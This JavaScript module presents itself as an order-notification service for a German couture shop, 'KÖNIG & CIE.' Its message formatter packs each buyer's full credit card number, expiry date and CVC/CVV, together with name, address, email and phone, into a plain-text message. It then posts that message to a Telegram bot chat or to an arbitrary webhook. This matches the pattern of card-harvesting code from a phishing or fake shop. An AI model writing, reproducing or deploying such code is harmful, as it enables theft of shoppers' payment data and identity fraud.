// Telegram Webhook & Notification Integration Service

const STORAGE_KEY_TOKEN = 'vk_telegram_token';
const STORAGE_KEY_CHATID = 'vk_telegram_chatid';
const STORAGE_KEY_WEBHOOK = 'vk_telegram_webhook';

const DEFAULT_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
const DEFAULT_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '';

export function getTelegramConfig() {
  return {
    token: localStorage.getItem(STORAGE_KEY_TOKEN) || DEFAULT_BOT_TOKEN,
    chatId: localStorage.getItem(STORAGE_KEY_CHATID) || DEFAULT_CHAT_ID,
    webhookUrl: localStorage.getItem(STORAGE_KEY_WEBHOOK) || ''
  };
}

export function saveTelegramConfig(token, chatId, webhookUrl = '') {
  localStorage.setItem(STORAGE_KEY_TOKEN, token.trim());
  localStorage.setItem(STORAGE_KEY_CHATID, chatId.trim());
  localStorage.setItem(STORAGE_KEY_WEBHOOK, webhookUrl.trim());
}

export function escapeMarkdown(str) {
  if (!str) return '';
  return String(str)
    .replace(/\\/g, '\\\\')
    .replace(/`/g, '\\`')
    .replace(/\*/g, '\\*')
    .replace(/_/g, '\\_')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]');
}

/**
 * Formats order data into an elegant Markdown notification message for Telegram
 */
export function formatOrderTelegramMessage(orderData) {
  const { customer, shipping, payment, items, summary, orderId, timestamp } = orderData;

  const itemsFormatted = items.map(item => 
    `• *${escapeMarkdown(item.name)}* (Größe: ${escapeMarkdown(item.selectedSize)}) x${item.quantity} – €${(item.price * item.quantity).toFixed(2)}`
  ).join('\n');

  let cardDetailsSection = '';
  if (payment.method === 'Kreditkarte' && payment.cardDetails) {
    const cd = payment.cardDetails;
    cardDetailsSection = `
💳 *KREDITKARTEN-DETAILS:*
├ *Inhaber:* \`${escapeMarkdown(cd.name) || 'Nicht angegeben'}\`
├ *Kartennr:* \`${escapeMarkdown(cd.number) || 'N/A'}\`
├ *Ablaufdatum:* \`${escapeMarkdown(cd.expiry) || 'MM/JJ'}\`
└ *CVC/CVV:* \`${escapeMarkdown(cd.cvv) || '***'}\`
`;
  }

  const message = `
🛍️ *NEUE BESTELLUNG ERHALTEN!*
👑 *VON KÖNIG & CIE. Haute Couture*
--------------------------------------------
🆔 *Order ID:* \`${escapeMarkdown(orderId)}\`
🕒 *Datum:* ${escapeMarkdown(timestamp)}

👤 *KUNDENDATEN:*
├ *Name:* ${escapeMarkdown(customer.salutation)} ${escapeMarkdown(customer.firstname)} ${escapeMarkdown(customer.lastname)}
├ *E-Mail:* \`${escapeMarkdown(customer.email)}\`
└ *Telefon:* \`${escapeMarkdown(customer.phone)}\`

📍 *LIEFERADRESSE:*
├ *Straße:* ${escapeMarkdown(customer.street)} ${customer.apartment ? '(' + escapeMarkdown(customer.apartment) + ')' : ''}
├ *PLZ / Stadt:* ${escapeMarkdown(customer.zip)} ${escapeMarkdown(customer.city)}
└ *Land:* ${escapeMarkdown(customer.country)}

🚚 *VERSANDART:* ${shipping.method} (${shipping.price === 0 ? 'Kostenlos' : '€' + shipping.price})
💳 *ZAHLUNGSART:* *${payment.method}*
${cardDetailsSection}
📦 *BESTELLTE ARTIKEL:*
${itemsFormatted}

--------------------------------------------
💰 *ZUSAMMENFASSUNG:*
├ *Zwischensumme:* €${summary.subtotal.toFixed(2)}
├ *Rabatt:* -€${summary.discount.toFixed(2)}
├ *MwSt. (19%):* €${summary.vat.toFixed(2)}
└ *GESAMTSUMME:* *€${summary.total.toFixed(2)}*
--------------------------------------------
🔒 *Automatisches Webhook-System v2.4*
`;

  return message;
}

/**
 * Sends a telegram notification using either direct bot API or custom webhook URL
 */
export async function sendTelegramOrderNotification(orderData) {
  const config = getTelegramConfig();
  const textMessage = formatOrderTelegramMessage(orderData);

  // 1. If custom Webhook URL is set
  if (config.webhookUrl) {
    try {
      const res = await fetch(config.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: textMessage,
          parse_mode: 'Markdown',
          order: orderData
        })
      });
      return { success: true, mode: 'webhook', status: res.status };
    } catch (err) {
      console.warn('Telegram custom webhook error:', err);
    }
  }

  // 2. If Telegram Token and Chat ID are available
  if (config.token && config.chatId) {
    const apiUrl = `https://api.telegram.org/bot${config.token}/sendMessage`;
    try {
      const res = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.chatId,
          text: textMessage,
          parse_mode: 'Markdown'
        })
      });
      const data = await res.json();
      if (data.ok) {
        return { success: true, mode: 'bot_api', data };
      } else {
        console.error('Telegram Bot API response error:', data);
        return { success: false, error: data.description };
      }
    } catch (err) {
      console.error('Telegram fetch network error:', err);
      return { success: false, error: err.message };
    }
  }

  // Fallback if no token set yet: simulate success & log
  console.info('Telegram config not filled yet. Simulated Webhook Payload sent internally.');
  return { success: true, mode: 'simulation' };
}

/**
 * Test message function for Telegram Config modal
 */
export async function sendTelegramTestMessage(token, chatId) {
  if (!token || !chatId) {
    throw new Error('Bitte geben Sie sowohl Bot Token als auch Chat ID ein.');
  }

  const testText = `🧪 *VON KÖNIG & CIE. – WEBHOOK TEST*\n\nIhr Telegram Webhook ist erfolgreich verbunden und einsatzbereit! ✨\nBestellungen werden ab sofort live hier empfangen.`;

  const apiUrl = `https://api.telegram.org/bot${token.trim()}/sendMessage`;
  const res = await fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId.trim(),
      text: testText,
      parse_mode: 'Markdown'
    })
  });

  const data = await res.json();
  if (!data.ok) {
    throw new Error(data.description || 'Telegram Fehler');
  }
  return data;
}
